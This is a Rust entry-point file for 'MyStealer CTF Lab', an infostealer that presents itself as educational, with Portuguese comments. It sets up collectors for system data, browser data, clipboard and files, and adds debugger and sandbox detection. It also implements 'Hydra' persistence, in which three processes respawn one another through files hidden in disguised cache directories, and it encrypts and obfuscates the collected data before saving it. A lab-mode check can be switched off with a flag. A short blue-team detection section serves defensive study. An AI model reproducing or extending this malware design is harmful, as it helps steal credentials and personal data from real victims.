//! MyStealer CTF Lab - Educational Infostealer
//!
//! ⚠️ AVISO: Este software é APENAS para fins educacionais.
//! Uso indevido é ILEGAL e pode resultar em consequências criminais.
//!
//! # Sistema Hydra
//!
//! Este stealer implementa o sistema Hydra de redundância:
//! - 3 processos (Alpha, Beta, Gamma) que se monitoram
//! - Se um morre, os outros o respawnam
//! - Comunicação via heartbeat files
//!
//! # Detecção (Blue Team)
//!
//! - Múltiplos processos do mesmo binário
//! - Arquivos .hb e .lock em ~/.cache/fontconfig (Linux) ou %LOCALAPPDATA%\.cache\ms-runtime (Windows)
//! - Padrão de respawn após kill

use clap::Parser;
use tracing::{info, warn, error, Level};
use tracing_subscriber::FmtSubscriber;

mod config;
mod collectors;
mod crypto;
mod exfil;
mod loader;
mod utils;

use config::Config;
use loader::{initialize_loader, run_loader_loop, get_hydra_status};
use utils::anti_analysis::EnvironmentChecker;
use utils::helpers::format_size;

/// MyStealer CTF Lab - Educational Infostealer
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Executar em modo laboratório (obrigatório para segurança)
    #[arg(long, default_value_t = true)]
    lab_mode: bool,

    /// Nível de logging (trace, debug, info, warn, error)
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Diretório de saída para dados coletados
    #[arg(short, long, default_value = "./output")]
    output_dir: String,

    /// Módulos a executar (separados por vírgula)
    #[arg(short, long, default_value = "system,browser,clipboard,files")]
    modules: String,

    /// Pular verificações de ambiente (PERIGOSO)
    #[arg(long, default_value_t = false)]
    skip_checks: bool,

    /// Ativar sistema Hydra (3 processos redundantes)
    #[arg(long, default_value_t = cfg!(feature = "hydra-auto"))]
    hydra: bool,

    /// Role do Hydra (interno - não usar manualmente)
    #[arg(long, hide = true)]
    hydra_role: Option<String>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Configurar logging (silencioso para processos Hydra secundários)
    let is_secondary = args.hydra_role.is_some();
    let log_level = if is_secondary {
        Level::WARN // Menos verbose para não poluir logs
    } else {
        match args.log_level.to_lowercase().as_str() {
            "trace" => Level::TRACE,
            "debug" => Level::DEBUG,
            "info" => Level::INFO,
            "warn" => Level::WARN,
            "error" => Level::ERROR,
            _ => Level::INFO,
        }
    };

    let subscriber = FmtSubscriber::builder()
        .with_max_level(log_level)
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .finish();

    tracing::subscriber::set_global_default(subscriber)
        .expect("Falha ao configurar logging");

    // Banner apenas para processo principal
    if !is_secondary {
        print_banner();
    }

    // Verificar modo lab
    #[cfg(feature = "lab-mode")]
    {
        if !is_secondary {
            info!("[*] Lab mode ACTIVE");
        }
        
        if !args.skip_checks {
            if !is_secondary {
                info!("[*] Checking environment...");
            }
            
            // Anti-analysis checks
            if EnvironmentChecker::is_debugger_present() {
                warn!("[!] Debugger detected");
            }
            
            if EnvironmentChecker::is_sandbox() {
                warn!("[!] Sandbox indicators found");
            }
            
            if EnvironmentChecker::timing_check() {
                warn!("[!] Timing anomaly detected");
            }
            
            match EnvironmentChecker::verify_lab_environment() {
                Ok(true) => {
                    if !is_secondary {
                        info!("[+] Lab environment verified");
                    }
                }
                Ok(false) => {
                    error!("[-] Not a lab environment!");
                    error!("[-] Run this ONLY in isolated VMs.");
                    error!("[-] Use --skip-checks to bypass (DANGEROUS!)");
                    std::process::exit(1);
                }
                Err(e) => {
                    warn!("[?] Could not verify environment: {}", e);
                }
            }
        } else if !is_secondary {
            warn!("[!] Security checks DISABLED!");
            warn!("[!] You're on your own!");
        }
    }

    #[cfg(not(feature = "lab-mode"))]
    {
        error!("❌ ERRO: Compilado sem modo laboratório!");
        error!("Recompile com: cargo build --features lab-mode");
        std::process::exit(1);
    }

    // Inicializar sistema Hydra se solicitado
    if args.hydra || args.hydra_role.is_some() {
        return run_hydra_mode(&args).await;
    }

    // Modo normal (sem Hydra)
    run_normal_mode(&args).await
}

/// Executa em modo Hydra (com redundância de processos)
async fn run_hydra_mode(args: &Args) -> anyhow::Result<()> {
    let role = args.hydra_role.as_deref();
    
    info!("[HYDRA] Initializing Hydra system...");
    
    // Inicializa o loader com sistema Hydra
    let state = initialize_loader(role).await
        .map_err(|e| anyhow::anyhow!("Hydra init failed: {}", e))?;
    
    // Obtém status
    let status = get_hydra_status(&state).await;
    info!("[HYDRA] Status: {}", status);
    
    // Se somos uma cabeça específica (não Alpha inicial), apenas monitora
    if role.is_some() {
        info!("[HYDRA] Running as secondary head - monitoring mode");
        run_loader_loop(state).await;
        return Ok(());
    }
    
    // Alpha: executa coleta E monitora
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );
    
    info!("[HYDRA] Alpha head - running collection and monitoring");
    
    // Spawn tarefa de monitoramento em background
    let monitor_state = state.clone();
    let monitor_handle = tokio::spawn(async move {
        run_loader_loop(monitor_state).await;
    });
    
    // Executa coleta
    let result = run_collection(&config).await;
    
    match result {
        Ok(data_path) => {
            info!("✅ Coleta concluída com sucesso!");
            info!("📁 Dados salvos em: {}", data_path);
            
            // Mostra status final do Hydra
            let final_status = get_hydra_status(&state).await;
            info!("[HYDRA] Final status: {}", final_status);
        }
        Err(e) => {
            error!("❌ Erro durante coleta: {}", e);
        }
    }
    
    // Continua monitorando (ou para se for one-shot)
    info!("[HYDRA] Collection complete - continuing to monitor...");
    info!("[HYDRA] Press Ctrl+C to stop all heads");
    
    // Aguarda monitor (infinito)
    let _ = monitor_handle.await;
    
    Ok(())
}

/// Executa em modo normal (sem Hydra)
async fn run_normal_mode(args: &Args) -> anyhow::Result<()> {
    // Carregar configuração
    let config = Config::new(
        args.output_dir.clone(),
        args.modules.split(',').map(|s| s.trim().to_string()).collect(),
    );

    info!("Configuração carregada:");
    info!("  Output: {}", config.output_dir);
    info!("  Módulos: {:?}", config.enabled_modules);

    // Executar coleta
    info!("Iniciando coleta de dados...");
    
    let result = run_collection(&config).await;

    match result {
        Ok(data_path) => {
            info!("✅ Coleta concluída com sucesso!");
            info!("📁 Dados salvos em: {}", data_path);
        }
        Err(e) => {
            error!("❌ Erro durante coleta: {}", e);
            return Err(e);
        }
    }

    info!("MyStealer CTF Lab finalizado.");
    Ok(())
}

fn print_banner() {
    println!(r#"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ███╗   ███╗██╗   ██╗███████╗████████╗███████╗ █████╗ ██╗   ║
    ║   ████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ║
    ║   ██╔████╔██║ ╚████╔╝ ███████╗   ██║   █████╗  ███████║██║   ║
    ║   ██║╚██╔╝██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██║██║   ║
    ║   ██║ ╚═╝ ██║   ██║   ███████║   ██║   ███████╗██║  ██║███████╗
    ║   ╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
    ║                                                              ║
    ║              CTF LAB v0.2 - Hydra Edition                    ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  ⚠️  AVISO: Apenas para fins educacionais em labs isolados   ║
    ║  🐍 Sistema Hydra: --hydra para ativar redundância           ║
    ╚══════════════════════════════════════════════════════════════╝
    "#);
}

async fn run_collection(config: &Config) -> anyhow::Result<String> {
    use collectors::CollectorManager;
    use crypto::{CryptoManager, obfuscation};
    use exfil::LocalExfiltrator;

    std::fs::create_dir_all(&config.output_dir)?;

    let mut manager = CollectorManager::new();
    
    for module in &config.enabled_modules {
        manager.register_module(module)?;
    }

    info!("[*] Running {} collectors...", manager.collector_count());
    let collected_data = manager.run_all().await?;

    info!("[*] Encrypting collected data...");
    let crypto = CryptoManager::new()?;
    let json_bytes = serde_json::to_vec(&collected_data)?;
    
    // Shuffle antes de criptografar (camada extra)
    let shuffle_seed = 0xDEADBEEF_u64;
    let shuffled = obfuscation::shuffle_bytes(&json_bytes, shuffle_seed);
    
    let encrypted = crypto.encrypt(&shuffled)?;
    
    info!("[*] Data size: {} -> {} (encrypted)", 
        format_size(json_bytes.len() as u64),
        format_size(encrypted.len() as u64));

    let exfil = LocalExfiltrator::new(&config.output_dir);
    let output_path = exfil.save(&encrypted)?;

    #[cfg(feature = "lab-mode")]
    {
        // Readable JSON for analysis
        let readable_path = format!("{}/collected_data_readable.json", config.output_dir);
        std::fs::write(&readable_path, serde_json::to_string_pretty(&collected_data)?)?;
        info!("[+] Readable version: {}", readable_path);
        
        // Demo XOR obfuscation
        let key = b"labkey123";
        let test_data = b"sensitive_string";
        let encoded = obfuscation::xor_encode(test_data, key);
        let decoded = obfuscation::xor_decode(&encoded, key);
        assert_eq!(test_data.as_slice(), decoded.as_slice());
        
        // Demo UUID encoding (nova técnica)
        let sample = b"test data for uuid encoding";
        let uuids = obfuscation::encode_as_uuid(sample);
        info!("[*] UUID encoded sample: {:?}", &uuids[..1]);
        
        // Demo base64
        let b64 = obfuscation::b64_encode(&encrypted[..32.min(encrypted.len())]);
        info!("[*] B64 sample: {}...", &b64[..32.min(b64.len())]);
    }

    Ok(output_path)
}
